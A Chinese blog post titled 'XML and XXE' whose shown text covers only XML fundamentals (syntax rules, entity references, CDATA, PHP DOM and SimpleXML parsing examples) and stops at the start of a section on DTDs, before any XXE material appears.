<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>xml与xxe | 忆 执 昔 来 的 旅 途</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  
  <meta name="keywords" content="Web漏洞" />
  
  
  
  
  <meta name="description" content="一、XML1.1 简介XML是一种用于标记电子文件使其具有结构性的 可扩展标记语言（EXtensible Markup Language）。 XML的前身是 标准通用标记语言 ，为了使标准通用标记语言显得用户友好，XML重新定义了标准通用标记语言的一些内部值和参数，去掉了大量的很少用到的功能，这些繁杂的功能使得标准通用标记语言在设计网站时显得复杂化。XML保留了标准通用标记语言的结构化功能，这样就">
<meta property="og:type" content="article">
<meta property="og:title" content="XML与XXE">
<meta property="og:url" content="https://xizhi-future.github.io/2021/10/01/XML%E4%B8%8EXXE/index.html">
<meta property="og:site_name" content="忆 执 昔 来 的 旅 途">
<meta property="og:description" content="一、XML1.1 简介XML是一种用于标记电子文件使其具有结构性的 可扩展标记语言（EXtensible Markup Language）。 XML的前身是 标准通用标记语言 ，为了使标准通用标记语言显得用户友好，XML重新定义了标准通用标记语言的一些内部值和参数，去掉了大量的很少用到的功能，这些繁杂的功能使得标准通用标记语言在设计网站时显得复杂化。XML保留了标准通用标记语言的结构化功能，这样就">
<meta property="og:locale">
<meta property="og:image" content="https://i.loli.net/2021/10/01/z7PSXUY9xhkpnBL.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/bsrz3YOW4MdU6qe.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/ldOAweu4xsMIWkr.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/XEiQ1UWsDwMqoKk.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/1MXarQISDvh8kjC.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/cAwrFKT9kLe1oqR.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/BPJbaF2HVAKTXjg.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/ZvIz6LwdcMQANU9.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/O7yTFhPHXEMZ5KD.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/lnXdb7kDyQFq5K6.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/7h6VMgZPfzImFHe.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/E7ipC4frbYIVXBT.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/v7K6L4nsfyYhGxm.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/MTmdcGnZlHxuNwi.png">
<meta property="og:image" content="https://i.loli.net/2021/10/01/8g31avFJlDqxnAZ.png">
<meta property="og:image" content="https://img2020.cnblogs.com/blog/2265061/202102/2265061-20210204114932441-1593681207.png">
<meta property="article:published_time" content="2021-10-01T09:16:32.000Z">
<meta property="article:modified_time" content="2021-10-01T09:21:35.693Z">
<meta property="article:author" content="xizhi-future">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="漏洞">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/10/01/z7PSXUY9xhkpnBL.png">
  
    <link rel="alternate" href="/atom.xml" title="忆 执 昔 来 的 旅 途" type="application/atom+xml">
  

  

  <link rel="icon" href="/css/images/mylogo.jpg">
  <link rel="apple-touch-icon" href="/css/images/mylogo.jpg">
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
  <link href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css" rel="stylesheet">
  <style type="text/css">
    @font-face{font-family:futura-pt; src:url("/css/fonts/FuturaPTBold.otf") format("woff");font-weight:500;font-style:normal;}
    @font-face{font-family:futura-pt-light; src:url("/css/fonts/FuturaPTBook.otf") format("woff");font-weight:lighter;font-style:normal;}
    @font-face{font-family:futura-pt-italic; src:url("/css/fonts/FuturaPTBookOblique.otf") format("woff");font-weight:400;font-style:italic;}
}

  </style>
  
<link rel="stylesheet" href="/css/style.css">


  
<script src="/js/jquery-3.1.1.min.js"></script>

  
<script src="/js/bootstrap.js"></script>


  <!-- Bootstrap core CSS -->
  <link rel="stylesheet" href="/css/bootstrap.css" >

  
    
<link rel="stylesheet" href="/css/dialog.css">

  

  

  
    <link rel="stylesheet" href="/css/header-post.css" >
  

  
  
  
    <link rel="stylesheet" href="/css/vdonate.css" >
  

<meta name="generator" content="Hexo 5.4.0"></head>



  <body data-spy="scroll" data-target="#toc" data-offset="50">


  
  <div id="container">
    <div id="wrap">
      
        <header>

    <div id="allheader" class="navbar navbar-default navbar-static-top" role="navigation">
        <div class="navbar-inner">
          
          <div class="container"> 
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
              <span class="sr-only">Toggle navigation</span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
              <span class="icon-bar"></span>
            </button>

            
              <a class="brand" style="
                 margin-top: 0px;"  
                href="#" data-toggle="modal" data-target="#myModal" >
                  <img width="124px" height="124px" alt="Hike News" src="/css/images/mylogo.jpg">
              </a>
            
            
            <div class="navbar-collapse collapse">
              <ul class="hnav navbar-nav">
                
                  <li> <a class="main-nav-link" href="/">Home</a> </li>
                
                  <li> <a class="main-nav-link" href="/archives">Archives</a> </li>
                
                  <li> <a class="main-nav-link" href="/categories">Categories</a> </li>
                
                  <li> <a class="main-nav-link" href="/tags">Tags</a> </li>
                
                  <li> <a class="main-nav-link" href="/about">About</a> </li>
                
                  <li><div id="search-form-wrap">

    <form class="search-form">
        <input type="text" class="ins-search-input search-form-input" placeholder="" />
        <button type="submit" class="search-form-submit"></button>
    </form>
    <div class="ins-search">
    <div class="ins-search-mask"></div>
    <div class="ins-search-container">
        <div class="ins-input-wrapper">
            <input type="text" class="ins-search-input" placeholder="Type something..." />
            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
        </div>
        <div class="ins-section-wrapper">
            <div class="ins-section-container"></div>
        </div>
    </div>
</div>
<script>
(function (window) {
    var INSIGHT_CONFIG = {
        TRANSLATION: {
            POSTS: 'Posts',
            PAGES: 'Pages',
            CATEGORIES: 'Categories',
            TAGS: 'Tags',
            UNTITLED: '(Untitled)',
        },
        ROOT_URL: '/',
        CONTENT_URL: '/content.json',
    };
    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
})(window);
</script>

<script src="/js/insight.js"></script>


</div></li>
            </div>
          </div>
                
      </div>
    </div>

</header>



      
            
      <div id="content" class="outer">
        
          <section id="main" style="float:none;"><article id="post-XML与XXE" style="width: 75%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" class="article-title" itemprop="name">
      XML与XXE
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	<a href="/2021/10/01/XML%E4%B8%8EXXE/" class="article-date">
	  <time datetime="2021-10-01T09:16:32.000Z" itemprop="datePublished">2021-10-01</time>
	</a>

      
    <a class="article-category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a>

      
	<a class="article-views">
	<span id="busuanzi_container_page_pv">
		PV:<span id="busuanzi_value_page_pv"></span>
	</span>
	</a>

      

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="一、XML"><a href="#一、XML" class="headerlink" title="一、XML"></a>一、XML</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>XML是一种用于标记电子文件使其具有结构性的 <strong>可扩展标记语言（EXtensible Markup Language）</strong>。</p>
<p><a target="_blank" rel="noopener" href="https://baike.baidu.com/item/XML">XML</a>的前身是 <a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标准通用标记语言 </a>，为了使标准通用标记语言显得用户友好，XML重新定义了标准通用标记语言的一些内部值和参数，去掉了大量的很少用到的功能，这些繁杂的功能使得标准通用标记语言在设计网站时显得复杂化。XML保留了标准通用标记语言的结构化功能，这样就使得网站设计者可以定义自己的文档类型，XML同时也推出一种新型文档类型，使得开发者也可以不必定义文档类型。</p>
<span id="more"></span>

<p><strong>特征，与 HTML 的区别：</strong></p>
<ul>
<li><p>XML 被设计用来 <code>被设计用来结构化、存储以及传输信息</code>，焦点是数据的内容。</p>
<p>HTML 被设计用来 <code>显示数据</code>，焦点是数据的外观。</p>
<p>HTML 旨在 <code>显示信息</code>，而 XML 旨在 <code>传输信息</code></p>
</li>
<li><p>XML 的设计宗旨是传输数据，而不是显示数据</p>
</li>
<li><p>XML 被设计为具有 <code>自我描述性</code></p>
</li>
<li><p>XML 标签没有被预定义。您需要自行定义标签（即允许创作者定义自己的标签和自己的文档结构）</p>
<p>HTML 文档只能使用在 HTML 标准中定义过的标签（如 <code>&lt;p&gt;、&lt;h1&gt;</code>  等等）</p>
</li>
<li><p>XML标签必须闭合，<code>允许 &lt;外观 /&gt;,不允许 &lt;外观&gt;，只可是 &lt;外观&gt;&lt;/外观&gt;</code></p>
<p>HTML可不闭合 ，可 <code>&lt;p&gt;,&lt;p&gt;&lt;/p&gt;,&lt;img /&gt;</code></p>
</li>
<li><p>XML标签的 <code>结构和样式分离</code></p>
<p>HTML标签的 <code>结构和样式结合在一起 &lt;h1&gt;标签</code> </p>
</li>
<li><p>是W3C的推荐标准</p>
</li>
</ul>
<p>注：本来发明XML是为了替换掉HTML标签的，最后由于各种原因，未能成功替换掉，于是解决办法是发明了一个新的 XHTML，该语言内部的技术使用的是XML的，而标签都是HTML的</p>
<p><strong>作用：</strong></p>
<ul>
<li><p>当作小型的数据库使用</p>
<ul>
<li><p>msg聊天工作通过xml文件在本地保留聊天记录</p>
</li>
<li><p>许多软件的 配置文件 都是通过xmk来保存的</p>
</li>
<li><p>许多媒体工资通过xml文件保留用户之前看到的媒体信息</p>
</li>
</ul>
</li>
<li><p>在网站当中当作 <strong>“接口”</strong> 服务</p>
</li>
<li><p>XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。</p>
</li>
</ul>
<p><strong>例子：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#XML文档</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">&lt;!ELEMENT message (hair,country,eye,body)&gt;</span><br><span class="line">&lt;!ELEMENT hair (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ELEMENT country (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">&lt;!ELEMENT eye (<span class="comment">#PCDATA)&gt; </span></span><br><span class="line">&lt;!ELEMENT body (<span class="comment">#PCDATA)&gt; </span></span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;</span><br><span class="line">    &lt;hair&gt;Black&lt;/hair&gt;</span><br><span class="line">    &lt;country&gt;China&lt;/country&gt;</span><br><span class="line">    &lt;eye&gt;big&lt;/eye&gt;</span><br><span class="line">    &lt;body&gt;You are handsome!&lt;/body&gt;</span><br><span class="line">&lt;/message&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/z7PSXUY9xhkpnBL.png" alt="image-20210426203632004"></p>
<p>充分体现了 具有自我描述性，但是这个 XML 文档仍然没有做任何事情。它仅仅是包装在 XML 标签中的纯粹的信息。我们需要编写软件或者程序，才能传送、接收和显示出这个文档。</p>
<h2 id="1-2-用途"><a href="#1-2-用途" class="headerlink" title="1.2 用途"></a>1.2 用途</h2><ul>
<li><p>XML 把数据从 HTML 分离，是独立于软件和硬件的信息传输工具</p>
</li>
<li><p>简化数据共享</p>
</li>
<li><p>简化数据传输</p>
</li>
<li><p>简化平台变更，其实也是简化数据的传输与共享</p>
</li>
</ul>
<h2 id="1-3-规则"><a href="#1-3-规则" class="headerlink" title="1.3 规则"></a>1.3 规则</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.XML文档必须有一个（唯一） 根元素 ，该元素是其他元素的 父元素</span><br><span class="line">2.XML每个元素都必须有开始和结束标签，即成对出现</span><br><span class="line">3.XML标签对大小写敏感，开始与闭合标签大小写类型需要一致</span><br><span class="line">4.XML元素需要正确嵌套，即不可交叉嵌套 <span class="comment">#&lt;abc&gt;&lt;test&gt;&lt;/abc&gt;&lt;/test&gt; 错误</span></span><br><span class="line">5.XML属性 必须有 值，且必须加引号</span><br><span class="line">6.特殊字符需要 实体引用</span><br><span class="line">7.注释：&lt;!--  --&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">标签的组成部分：</span><br><span class="line">1.字母，数字，下划线</span><br><span class="line">2.不能以 数字和标点符号 开始</span><br><span class="line">3.不能包含 空格</span><br><span class="line">4.最好避免使用 - , . , : 等</span><br></pre></td></tr></table></figure>

<p><strong>实体引用</strong></p>
<table>
<thead>
<tr>
<th><code>&amp;lt;</code></th>
<th>&lt;</th>
</tr>
</thead>
<tbody><tr>
<td><code>&amp;gt;</code></td>
<td>&gt;</td>
</tr>
<tr>
<td><code>&amp;amp;</code></td>
<td>&amp;</td>
</tr>
<tr>
<td><code>&amp;apos;</code></td>
<td>‘</td>
</tr>
<tr>
<td><code>&amp;quot;</code></td>
<td>“</td>
</tr>
</tbody></table>
<p>其实在 XML 中，只有字符 “&lt;” 和 “&amp;” 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。</p>
<h2 id="1-4-PCDATA"><a href="#1-4-PCDATA" class="headerlink" title="1.4 PCDATA"></a>1.4 PCDATA</h2><p><strong>被解析的字符，文本</strong></p>
<p>不能含有 特殊字符</p>
<h2 id="1-5-CDATA"><a href="#1-5-CDATA" class="headerlink" title="1.5 CDATA"></a>1.5 CDATA</h2><p><strong>不会被解析的字符，文本</strong></p>
<p>当需要显示的特殊符号偏多，但又不想使用实体的引用时，可使用 CDATA，它指的是不应该由 XML解释器进行解析的文本数据。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用</span></span><br><span class="line">&lt;![CDATA[文本数据]]&gt;</span><br><span class="line"><span class="comment">#例子：&lt;eye&gt;&lt;![CDATA[&lt;sdsdj&gt;&gt;&gt;&amp;&amp;dfd&#x27;f&quot;]]&gt;big&lt;/eye&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/01/bsrz3YOW4MdU6qe.png" alt="image-20210426210731208"></p>
<h2 id="1-6-XML-属性-与-元素"><a href="#1-6-XML-属性-与-元素" class="headerlink" title="1.6 XML 属性 与 元素"></a>1.6 XML 属性 与 元素</h2><p><strong>属性：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">day</span>=<span class="string">&quot;10&quot;</span> <span class="attr">month</span>=<span class="string">&quot;01&quot;</span> <span class="attr">year</span>=<span class="string">&quot;2008&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">to</span>=<span class="string">&quot;Tove&quot;</span> <span class="attr">from</span>=<span class="string">&quot;Jani&quot;</span> <span class="attr">heading</span>=<span class="string">&quot;Reminder&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">body</span>=<span class="string">&quot;Don&#x27;t forget me this weekend!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#缺点：</span></span><br><span class="line">属性不能包含多个值</span><br><span class="line">不能包含树结构</span><br><span class="line">不容易扩展</span><br><span class="line">难以阅读</span><br></pre></td></tr></table></figure>

<p><strong>元素：</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">date</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">day</span>&gt;</span>10<span class="tag">&lt;/<span class="name">day</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">month</span>&gt;</span>01<span class="tag">&lt;/<span class="name">month</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2008<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>建议：使用元素</strong></p>
<p><strong>特别的：ID属性，便于访问XML元素</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">messages</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;p501&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;p502&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Re: Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>I will not!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">messages</span>&gt;</span> </span><br></pre></td></tr></table></figure>

<h2 id="1-7-XML在浏览器中的显示"><a href="#1-7-XML在浏览器中的显示" class="headerlink" title="1.7 XML在浏览器中的显示"></a>1.7 XML在浏览器中的显示</h2><p><strong>显示：单独的 XML 文档不会携带有关如何显示数据的信息，直接将XML的源码显示出来。</strong></p>
<p><strong>方法：</strong></p>
<ul>
<li><p><strong>链接到CSS文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml-stylesheet type=&quot;text/css&quot; href=&quot;cd_catalog.css&quot;?&gt;</span><br></pre></td></tr></table></figure>

<p>使用 CSS 格式化 XML 不是常用的方法</p>
</li>
<li><p><strong>使用 XSLT，把 XML 文档转换成 HTML 格式显示</strong></p>
<p>XSLT 是首选的 XML 样式表语言，当浏览器读取 XML 文件时，XSLT 转换是由浏览器完成的</p>
<p>使用 XSLT 来转换 XML 时，不同的浏览器可能会产生不同结果。为了减少这种问题，可以在服务器上进行 XSLT 转换。</p>
<p><img src="https://i.loli.net/2021/10/01/ldOAweu4xsMIWkr.png" alt="image-20210427172835529"></p>
</li>
</ul>
<h2 id="1-8-XML-的解析"><a href="#1-8-XML-的解析" class="headerlink" title="1.8 XML 的解析"></a>1.8 XML 的解析</h2><p>所有现代浏览器都有内建的 XML 解析器。</p>
<p>XML 解析器把 XML 文档转换为 XML DOM 对象 - 可通过 JavaScript 操作的对象。</p>
<p><strong>XML DOM</strong> :</p>
<p>XML DOM（XML Document Object Model）定义了访问和操作 XML 文档的标准方法，把 XML 文档作为树结构来查看。</p>
<p>通过 DOM 树可以 访问 和 修改或删除 它们的内容，并 创建新的元素。</p>
<p><strong>有两种基本的 XML 解析器类型：</strong></p>
<ul>
<li>基于树的解析器：这种解析器把 XML 文档转换为树型结构。它分析整篇文档，并提供了对树中元素的访问，例如文档对象模型 (DOM)。</li>
<li>基于事件的解析器：将 XML 文档视为一系列的事件。当某个具体的事件发生时，解析器会调用函数来处理。</li>
</ul>
<p>DOM 解析器是基于树的解析器。</p>
<h3 id="1-8-1-PHP-XML-DOM"><a href="#1-8-1-PHP-XML-DOM" class="headerlink" title="1.8.1 PHP XML DOM"></a>1.8.1 PHP XML DOM</h3><p>内建的 DOM 解析器使在 PHP 中处理 XML 文档成为可能。</p>
<p>也就是说DOM XML 解析器函数是 PHP 核心的组成部分。无需安装就可以使用这些函数。</p>
<p><strong>示例：</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#xml：&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;&lt;message&gt;    &lt;hair&gt;Black&lt;/hair&gt;    &lt;country&gt;China&lt;/country&gt;    &lt;eye&gt;big&lt;/eye&gt;    &lt;body&gt;You are handsome!&lt;/body&gt;&lt;/message&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php:直接输出&lt;?php$xmlDoc = new DOMDocument();#创建DOMDocument对象$xmlDoc-&gt;load(&quot;test.xml&quot;);#将test.xml加载进去print $xmlDoc-&gt;saveXML();#把内部 XML 文档放入一个字符串，用于输出?&gt; </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php:遍历 XML&lt;?php$xmlDoc = new DOMDocument();$xmlDoc-&gt;load(&quot;test.xml&quot;);$x = $xmlDoc-&gt;documentElement;foreach ($x-&gt;childNodes AS $item)&#123;    print $item-&gt;nodeName . &quot; = &quot; . $item-&gt;nodeValue . &quot;&lt;br&gt;&quot;;&#125;?&gt; </span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php:SimpleXML&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);print_r($xml);?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$xml</span>=simplexml_load_file(<span class="string">&quot;test.xml&quot;</span>);<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;hair . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;country . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;eye . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;body;?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$xml</span>=simplexml_load_file(<span class="string">&quot;test.xml&quot;</span>);<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;getName() . <span class="string">&quot;&lt;br&gt;&quot;</span>; foreach(<span class="variable">$xml</span>-&gt;children() as <span class="variable">$child</span>)&#123;    <span class="built_in">echo</span> <span class="variable">$child</span>-&gt;getName() . <span class="string">&quot;: &quot;</span> . <span class="variable">$child</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;&#125;?&gt;</span><br></pre></td></tr></table></figure>

<p> <a target="_blank" rel="noopener" href="https://www.runoob.com/dom/dom-tutorial.html">XML DOM 教程</a></p>
<h2 id="1-9-文档结构-—-树结构"><a href="#1-9-文档结构-—-树结构" class="headerlink" title="1.9 文档结构 — 树结构"></a>1.9 文档结构 — 树结构</h2><ul>
<li><strong>XML声明</strong></li>
<li><strong>DTD文档类型定义（可选）</strong></li>
<li><strong>文档元素</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;	&lt;note&gt;	<span class="comment">#根元素，与其它元素之间是 父子关系;各个子元素之间：同胞关系&lt;to&gt;Tove&lt;/to&gt;#四个子元素：to,from,heading,body&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="1-9-1-XML声明"><a href="#1-9-1-XML声明" class="headerlink" title="1.9.1 XML声明"></a>1.9.1 XML声明</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;<span class="comment">#XML声明: 用于告诉浏览器这是一个xml文档；当看到该声明时，浏览器会自动调用 xml解释器 运行该xml文档#version属性：用于说明当前xml文档的版本，属性必须#encodeing属性：用于说明当前xml文档使用的字符编码集，xml解析器会使用这个编码来解析xml文档，属性可选</span></span><br></pre></td></tr></table></figure>

<h3 id="1-9-2-DTD文档类型定义（可选）"><a href="#1-9-2-DTD文档类型定义（可选）" class="headerlink" title="1.9.2 DTD文档类型定义（可选）"></a>1.9.2 DTD文档类型定义（可选）</h3><p><strong>DTD(Document Type Definition) 即 文档类型定义</strong>，作用是定义 XML 文档的合法构建模块，这个模块里面 <code>定义了用户自己创建的根元素以及对应的子元素和根元素的合法子元素和属性</code>，那么文档中的所有元素都必须以该DTD为模板, <code>用于对XML的元素的内容进行相应的规范化</code>。</p>
<p><strong>作用：验证你的XML</strong></p>
<p><strong>格式：定义元素</strong></p>
